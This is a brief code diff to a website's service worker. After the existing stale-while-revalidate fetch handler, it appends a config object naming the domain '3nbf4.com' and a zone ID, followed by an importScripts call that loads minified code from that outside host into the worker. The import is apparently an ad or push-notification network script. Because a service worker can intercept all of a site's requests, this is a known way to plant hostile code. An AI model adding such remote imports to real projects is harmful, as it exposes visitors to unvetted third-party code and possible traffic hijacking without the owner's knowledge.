@@ -98,3 +98,10 @@ self.addEventListener("fetch", (event) => {
     event.respondWith(staleWhileRevalidate(req));
   }
 });
+
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10605136
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
